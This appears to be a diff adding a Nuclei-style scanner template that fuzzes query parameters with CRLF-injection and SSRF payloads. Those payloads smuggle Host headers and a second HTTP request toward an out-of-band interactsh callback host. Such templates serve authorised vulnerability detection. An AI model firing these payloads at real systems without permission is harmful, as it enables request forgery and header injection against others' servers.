@@ -1,0 +1,53 @@
+id: ssrf-bypass-via-crlf
+
+info:
+  name: SSRF bypass via CRLF
+  author: reewardius
+  severity: medium
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+    - https://github.com/r0075h3ll/Oralyzer/blob/master/core/crlf.py
+    - https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922
+  tags: fuzzing-crlf,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    
+    payloads:
+      ssrf:
+        - "%09Host:{{interactsh-url}}"
+        - "%09http://{{interactsh-url}}"
+        - "%0A%01%09Host:{{interactsh-url}}"
+        - "%0AHost:{{interactsh-url}}"
+        - "%0Ahttp://{{Hostname}}@{{interactsh-url}}"
+        - "%0D%0AHost:{{interactsh-url}}"
+        - "%0D%0Ahttp://{{Hostname}}@{{interactsh-url}}"
+        - "%0D%0Ahttp://{{Hostname}}\\@{{interactsh-url}}"
+        - "%0D%0Ahttp://{{interactsh-url}}"
+        - "%0DHost:{{interactsh-url}}"
+        - "%0Dhttp://{{Hostname}}@{{interactsh-url}}"
+        - "%20http://{{Hostname}}@{{interactsh-url}}"
+        - "http://{{Hostname}}@{{interactsh-url}}/%0d%0aGET%20/ssrf-request%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0a"
+        - "http://{{Hostname}}\\@{{interactsh-url}}"
+        - "http://{{interactsh-url}}/%0d%0aGET%20/ssrf-request%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0a"
+        - '%0Ahttp://{{interactsh-url}}'
+        - '%0Dhttp://{{interactsh-url}}'
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{ssrf}}"
+          
+    stop-at-first-match: true
+    redirects: true
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
+        condition: or
